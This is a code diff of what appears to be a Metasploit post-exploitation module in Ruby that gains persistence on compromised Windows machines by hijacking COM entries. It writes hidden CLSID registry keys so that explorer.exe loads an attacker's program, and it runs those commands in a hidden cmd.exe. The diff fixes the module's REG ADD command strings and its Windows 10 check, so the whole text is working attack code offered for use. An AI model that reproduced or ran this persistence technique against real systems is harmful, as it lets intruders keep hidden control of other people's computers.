@@ -159,9 +159,9 @@ def run
       return nil
     end
     #
-    # check for proper operating system (windows 10)
+    # check for proper operating system (not windows 10)
     #
-    if not sysinfo['OS'] =~ /Windows 10/
+    if sysinfo['OS'] =~ /Windows 10/
       print_warning("windows 10 version its protected againts this exploit ...")
       print_line("---------------------------------------------------------")
       print_line("Disable 'access controled to folders' in windows defender")
@@ -240,18 +240,18 @@ def run
        print_status("Persiste in explorer.exe selected ..")
        Rex::sleep(1.0)
        hacks = [
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{app_path}" /f',
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d" /f',
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment" /f',
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d" /f',
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d" /f',
+        'REG ADD "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{app_path}" /f',
+        'REG ADD "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d" /f',
+        'REG ADD "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment" /f',
+        'REG ADD "#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d" /f',
+        'REG ADD "#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d" /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
        ]
      else
        print_status("Demo mode selected ..")
        Rex::sleep(1.0)
        hacks = [
-        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f',
+        'REG ADD "#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f',
         'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
        ]
      end
@@ -304,7 +304,7 @@ def run
          r=''
          print_status("Delete registry entry: #{new_GUID}..")
          Rex::sleep(1.0)
-         reg_clear = "REG DELETE HKCU\\Software\\Classes\\CLSID\\#{new_GUID} /f"
+         reg_clear = "REG DELETE #{hive_key}\\#{new_GUID} /f"
          r = session.sys.process.execute("cmd.exe /c #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
          print_status("Deleted: #{reg_clear}")
          Rex::sleep(1.0)
